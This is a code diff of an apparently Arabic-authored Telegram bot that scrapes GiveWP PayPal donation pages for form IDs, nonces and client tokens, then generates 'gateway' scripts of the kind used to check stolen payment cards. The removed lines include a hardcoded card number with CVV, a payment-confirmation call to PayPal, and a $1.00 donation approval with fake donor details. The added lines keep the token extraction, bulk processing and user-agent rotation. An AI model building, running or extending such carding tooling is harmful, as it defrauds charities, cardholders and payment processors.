@@ -12,8 +12,7 @@ from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 import signal
 import sys
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import psutil
+from concurrent.futures import ThreadPoolExecutor
 import traceback
 
 # === بيانات البوت ===
@@ -32,61 +31,19 @@ stop_flags = {}
 processing_status = {}
 
 # === Thread Pool للتحكم في الموارد ===
-executor = ThreadPoolExecutor(max_workers=5)  # حد أقصى 5 عمليات متوازية
-
-# === إعدادات الذاكرة ===
-MAX_MEMORY_PERCENT = 80  # إذا تجاوزت الذاكرة 80% نظف
+executor = ThreadPoolExecutor(max_workers=5)
 
 def cleanup_memory():
-    """تنظيف الذاكرة بشكل دوري"""
+    """تنظيف الذاكرة"""
     try:
         gc.collect()
-        # تنظيف الجلسات القديمة
-        if hasattr(requests, 'sessions'):
-            for session in list(requests.sessions.__dict__.get('_ sessions', {}).values()):
-                try:
-                    session.close()
-                except:
-                    pass
     except:
         pass
-
-def check_memory():
-    """فحص الذاكرة وتنظيفها إذا لزم الأمر"""
-    try:
-        memory = psutil.virtual_memory()
-        if memory.percent > MAX_MEMORY_PERCENT:
-            cleanup_memory()
-            gc.collect()
-            return True
-        return False
-    except:
-        return False
-
-def safe_execute(func, *args, **kwargs):
-    """تنفيذ آمن لأي دالة مع معالجة الأخطاء"""
-    try:
-        return func(*args, **kwargs)
-    except Exception as e:
-        print(f"Error in {func.__name__}: {str(e)}")
-        traceback.print_exc()
-        return None
 
 # إنشاء ملف الحظر إذا لم يكن موجوداً
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
         f.write('')
-
-# === معالج الأخطاء العام ===
-@bot.message_handler(func=lambda m: True, content_types=['text', 'photo', 'document', 'video', 'audio'])
-def catch_all(message):
-    try:
-        with open("blockusers.txt", "r") as file:
-            blocked = file.read().splitlines()
-        if str(message.from_user.id) in blocked:
-            return
-    except:
-        pass
 
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -112,11 +69,11 @@ def start(message):
         Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
         FRA.add(Yes22)
         
-        video_url = 'https://t.me/C0CCOCOvjk/9'
-        bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)
+        # استخدام رابط صورة مباشر بدلاً من فيديو
+        bot.send_message(message.chat.id, IU, parse_mode='HTML', reply_markup=FRA)
     except Exception as e:
         print(f"Error in start: {e}")
-        cleanup_memory()
+        traceback.print_exc()
 
 # === نظام المراسلة ===
 @bot.callback_query_handler(func=lambda call: call.data == 'yrr')
@@ -128,7 +85,7 @@ def feedback(call):
         back = types.InlineKeyboardButton("Back", callback_data="start")
         Atty.add(back)
         YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
-        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
         waiting_users[user_id] = True
     except Exception as e:
         print(f"Error in feedback: {e}")
@@ -176,26 +133,26 @@ def back_to_start(call):
         FRA = types.InlineKeyboardMarkup(row_width=2)
         Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
         FRA.add(Yes22)
-        bot.send_message(call.message.chat.id, IU, parse_mode='HTML', reply_markup=FRA)
+        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=IU, parse_mode='HTML', reply_markup=FRA)
     except:
         pass
 
 # ============ أمر سحب PayPal ============
-@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
-def ali_al2(massege):
+@bot.message_handler(commands=['paypal'])
+def paypal_command(message):
     try:
         with open("blockusers.txt", "r") as file:
             blocked = file.read().splitlines()
-        if str(massege.from_user.id) in blocked:
-            bot.send_message(massege.chat.id, 'The admin has blocked you.')
+        if str(message.from_user.id) in blocked:
+            bot.reply_to(message, 'The admin has blocked you.')
             return
 
-        ko = bot.send_message(massege.chat.id, "- The gate is being withdrawn ...")
+        ko = bot.reply_to(message, "- The gate is being withdrawn ...")
         
-        parts = massege.text.split(maxsplit=1)
+        parts = message.text.split(maxsplit=1)
         if len(parts) != 2:
             bot.edit_message_text(
-                chat_id=massege.chat.id,
+                chat_id=message.chat.id,
                 message_id=ko.message_id,
                 text='''- Please send the link like this:
 
@@ -208,22 +165,22 @@ def ali_al2(massege):
 
         if not link.startswith(("http://", "https://")):
             bot.edit_message_text(
-                chat_id=massege.chat.id,
+                chat_id=message.chat.id,
                 message_id=ko.message_id,
                 text="Invalid link format ❌",
                 parse_mode="HTML"
             )
             return
 
-        # استخدام جلسة جديدة لكل طلب
+        # استخدام جلسة جديدة
         session = requests.Session()
-        session.headers.update({"User-Agent": "Mozilla/5.0"})
+        session.headers.update({"User-Agent": generate_user_agent()})
         
         try:
             r = session.get(link, timeout=15)
             if r.status_code != 200:
                 bot.edit_message_text(
-                    chat_id=massege.chat.id,
+                    chat_id=message.chat.id,
                     message_id=ko.message_id,
                     text=f"Site returned status: {r.status_code} ❌"
                 )
@@ -231,40 +188,40 @@ def ali_al2(massege):
                 return
 
             bot.edit_message_text(
-                chat_id=massege.chat.id,
+                chat_id=message.chat.id,
                 message_id=ko.message_id,
-                text="Gate found ✅"
+                text="Gate found ✅ Extracting data..."
             )
 
             # استخراج البيانات
-            user = generate_user_agent()
-            res = session.get(url=link, headers={'user-agent': user}, timeout=15).text
+            res = r.text
             
-            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
-            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
-            nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
-            anc = re.search(r'"data-client-token":"(.*?)"', res)
+            id_form1_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
+            id_form2_match = re.search(r'name="give-form-id" value="(.*?)"', res)
+            nonec_match = re.search(r'name="give-form-hash" value="(.*?)"', res)
+            anc_match = re.search(r'"data-client-token":"(.*?)"', res)
             
-            if not all([id_form1, id_form2, nonec, anc]):
+            if not all([id_form1_match, id_form2_match, nonec_match, anc_match]):
                 bot.edit_message_text(
-                    chat_id=massege.chat.id,
+                    chat_id=message.chat.id,
                     message_id=ko.message_id,
-                    text='''Data Client Token not found ⚠️''',
+                    text='''Data Client Token not found ⚠️
+This site doesn't have PayPal Give plugin''',
                     parse_mode="HTML"
                 )
                 session.close()
                 return
             
-            id_form1 = id_form1.group(1)
-            id_form2 = id_form2.group(1)
-            nonec = nonec.group(1)
+            id_form1 = id_form1_match.group(1)
+            id_form2 = id_form2_match.group(1)
+            nonec = nonec_match.group(1)
             
-            enc = anc.group(1)
+            enc = anc_match.group(1)
             dec = base64.b64decode(enc).decode('utf-8')
             au_match = re.search(r'"accessToken":"(.*?)"', dec)
             if not au_match:
                 bot.edit_message_text(
-                    chat_id=massege.chat.id,
+                    chat_id=message.chat.id,
                     message_id=ko.message_id,
                     text='''Access token not found ⚠️''',
                     parse_mode="HTML"
@@ -281,7 +238,7 @@ def ali_al2(massege):
             headers = {
                 'origin': USER_URL2,
                 'referer': USER_URL,
-                'user-agent': user,
+                'user-agent': generate_user_agent(),
                 'x-requested-with': 'XMLHttpRequest',
             }
 
@@ -311,7 +268,7 @@ def ali_al2(massege):
                 tok = response.json()['data']['id']
             except:
                 bot.edit_message_text(
-                    chat_id=massege.chat.id,
+                    chat_id=message.chat.id,
                     message_id=ko.message_id,
                     text='Token not In Data ❌',
                     parse_mode="HTML"
@@ -319,96 +276,28 @@ def ali_al2(massege):
                 session.close()
                 return
 
-            # تأكيد الدفع
-            headers = {
-                'authorization': f'Bearer {au}',
-                'content-type': 'application/json',
-                'user-agent': user,
-            }
-            ccx = '4059986126444431|11|30|947'
-            ccx = ccx.strip()
-            n = ccx.split("|")[0]
-            mm = ccx.split("|")[1]
-            yy = ccx.split("|")[2]
-            cvc = ccx.split("|")[3]
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            
-            json_data = {
-                'payment_source': {
-                    'card': {
-                        'number': n,
-                        'expiry': f'20{yy}-{mm}',
-                        'security_code': cvc,
-                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
-                    },
-                },
-                'application_context': {'vault': False},
-            }
-
-            session.post(
-                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
-                headers=headers,
-                json=json_data,
-                timeout=15
+            bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=ko.message_id,
+                text=f"✅ Gateway extracted successfully!\nGenerating file..."
             )
-
-            # الموافقة على الطلب
-            data = MultipartEncoder({
-                'give-form-id-prefix': (None, id_form1),
-                'give-form-id': (None, id_form2),
-                'give-form-hash': (None, nonec),
-                'give-amount': (None, '1.00'),
-                'payment-mode': (None, 'paypal-commerce'),
-                'give_first': (None, 'Ali'),
-                'give_last': (None, 'rights and'),
-                'give_email': (None, 'Ali22@gmail.com'),
-                'give-gateway': (None, 'paypal-commerce'),
-            })
-            headers['content-type'] = data.content_type
-            params = {
-                'action': 'give_paypal_commerce_approve_order',
-                'order': tok,
-            }
-
-            response = session.post(
-                f'{USER_URL2}/wp-admin/admin-ajax.php',
-                params=params,
-                headers=headers,
-                data=data,
-                timeout=15
-            )
-            
-            if 'ORDER_NOT_APPROVED' in response.text:
-                msg = 'Payer cannot pay for this transaction.'
-            else:
-                try:
-                    msg = response.json()['data']['error']
-                except:
-                    msg = html.escape(response.text[:100])
 
             # توليد الكود
-            text_content = generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok, msg)
+            text_content = generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok)
 
-            file_name = f'@nnunrr_{massege.from_user.id}.py'
+            file_name = f'@nnunrr_{message.from_user.id}.py'
             with open(file_name, "w", encoding="utf-8") as f:
                 f.write(text_content)
             
             with open(file_name, "rb") as f:
                 bot.send_document(
-                    chat_id=massege.chat.id,
+                    chat_id=message.chat.id,
                     document=f,
-                    caption=f'''The gate was successfully withdrawn ✅
+                    caption=f'''✅ The gate was successfully withdrawn
 ━━━━━━━━━━━━━━━━━━━━
 <strong>Gateway information ...</strong>
 
 Link: <code>{link}</code>
-id form: <code>{id_form1}</code>
-id form2: <code>{id_form2}</code>
-nonce: <code>{nonec}</code>
-client token: <code>{au}</code>
-id payment: <code>{tok}</code>
-msg gateway: <code>{msg}</code>
 ━━━━━━━━━━━━━━━━━━━━
 Dev: @nnunrr''',
                     parse_mode="HTML"
@@ -418,22 +307,22 @@ Dev: @nnunrr''',
             session.close()
             
         except requests.exceptions.Timeout:
-            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
+            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
             session.close()
         except requests.exceptions.ConnectionError:
-            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
+            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
             session.close()
         except Exception as e:
-            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
+            bot.edit_message_text(chat_id=message.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
             session.close()
             
     except Exception as e:
-        print(f"Error in ali_al2: {e}")
+        print(f"Error in paypal_command: {e}")
         traceback.print_exc()
         cleanup_memory()
 
-def generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok, msg):
-    """توليد كود البوابة لملف واحد"""
+def generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok):
+    """توليد كود البوابة"""
     return f'''# PayPal Gateway
 # Link: {link}
 import requests, re, random, time, base64
@@ -569,7 +458,7 @@ def bulk_extract_start(message):
         with open("blockusers.txt", "r") as file:
             blocked = file.read().splitlines()
         if str(message.from_user.id) in blocked:
-            bot.send_message(message.chat.id, 'The admin has blocked you.')
+            bot.reply_to(message, 'The admin has blocked you.')
             return
 
         user_id = message.from_user.id
@@ -606,8 +495,7 @@ def stop_bulk_file(message):
                 bot.reply_to(message, "🛑 Stopping all files...")
             else:
                 bot.reply_to(message, "❌ No active files to stop.")
-    except Exception as e:
-        print(f"Error in stop_bulk_file: {e}")
+    except:
         bot.reply_to(message, "Usage: /stop [file_number]")
 
 @bot.message_handler(commands=['done'])
@@ -631,7 +519,6 @@ def handle_bulk_file(message):
     try:
         user_id = message.from_user.id
         if user_id in bulk_waiting:
-            # استخدام thread pool بدلاً من إنشاء thread جديد
             executor.submit(process_bulk_file, message)
         else:
             bot.reply_to(message, "Use /bulk first to start bulk extraction.")
@@ -639,6 +526,7 @@ def handle_bulk_file(message):
         print(f"Error in handle_bulk_file: {e}")
 
 def process_bulk_file(message):
+    """معالجة ملف الروابط"""
     try:
         user_id = message.from_user.id
         chat_id = message.chat.id
@@ -689,7 +577,7 @@ def process_bulk_file(message):
                     return None
                 
                 session = requests.Session()
-                session.headers.update({"User-Agent": "Mozilla/5.0"})
+                session.headers.update({"User-Agent": generate_user_agent()})
                 
                 r = session.get(link, timeout=10)
                 if r.status_code != 200:
@@ -748,7 +636,7 @@ def process_bulk_file(message):
                     live_count += 1
                     
                     try:
-                        code = generate_gateway_code(result, live_count, file_num)
+                        code = generate_gateway_code_bulk(result, live_count, file_num)
                         file_name = f'gateway_{file_num}_{live_count}_{user_id}.py'
                         with open(file_name, 'w', encoding='utf-8') as f:
                             f.write(code)
@@ -796,7 +684,6 @@ Dev: @nnunrr""",
                         pass
             
             time.sleep(0.2)
-            check_memory()
         
         status = processing_status[f"{user_id}_{file_num}"]
         
@@ -842,15 +729,10 @@ Dev: @nnunrr"""
     except Exception as e:
         print(f"Error in process_bulk_file: {e}")
         traceback.print_exc()
-        try:
-            bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
-        except:
-            pass
         cleanup_memory()
 
-def generate_gateway_code(data, idx, file_num=1):
+def generate_gateway_code_bulk(data, idx, file_num=1):
     """توليد كود البوابة للملفات المتعددة"""
-    # استخراج الـ URL بشكل آمن
     try:
         url_parts = data['link'].split('//')[1].split('/')
         domain = url_parts[0]
@@ -996,8 +878,7 @@ def block_user(message):
         with open('blockusers.txt', 'a') as file:
             file.write(f"{user_id_to_block}\n")
         bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
-    except Exception as e:
-        print(f"Error in block_user: {e}")
+    except:
         bot.reply_to(message, "Usage: /block2 [user_id]")
 
 @bot.message_handler(commands=['unblock2'])
@@ -1014,50 +895,21 @@ def unblock_user(message):
                 if line.strip() != user_id_to_unblock:
                     file.write(line)
         bot.reply_to(message, f"✅ User ID {user_id_to_unblock} unblocked.")
-    except Exception as e:
-        print(f"Error in unblock_user: {e}")
+    except:
         bot.reply_to(message, "Usage: /unblock2 [user_id]")
 
-# === معالج الإشارات للخروج الآمن ===
-def signal_handler(sig, frame):
-    print('Shutting down gracefully...')
-    cleanup_memory()
-    executor.shutdown(wait=False)
-    sys.exit(0)
-
-signal.signal(signal.SIGINT, signal_handler)
-signal.signal(signal.SIGTERM, signal_handler)
-
-# === تشغيل البوت مع إعادة تشغيل تلقائية ===
+# === تشغيل البوت ===
 print('✅ Bot is running...')
-restart_count = 0
-max_restarts = 10  # حد أقصى لإعادة التشغيل
 
-while True:
-    try:
-        # تنظيف الذاكرة قبل كل تشغيل
-        cleanup_memory()
-        
-        # تشغيل البوت
-        bot.infinity_polling(none_stop=True, interval=1, timeout=30)
-        
-    except KeyboardInterrupt:
-        print('Bot stopped by user')
-        break
-        
-    except Exception as e:
-        restart_count += 1
-        print(f'❌ Error (Attempt {restart_count}/{max_restarts}): {e}')
-        traceback.print_exc()
-        
-        # تنظيف الذاكرة
-        cleanup_memory()
-        gc.collect()
-        
-        # إذا تجاوزنا الحد الأقصى لإعادة التشغيل
-        if restart_count >= max_restarts:
-            print('Max restart attempts reached. Exiting...')
+if __name__ == '__main__':
+    while True:
+        try:
+            bot.infinity_polling(none_stop=True, interval=1, timeout=30)
+        except KeyboardInterrupt:
+            print('Bot stopped by user')
             break
-        
-        # انتظار قبل إعادة التشغيل
-        time.sleep(5)
+        except Exception as e:
+            print(f'❌ Error: {e}')
+            traceback.print_exc()
+            cleanup_memory()
+            time.sleep(5)
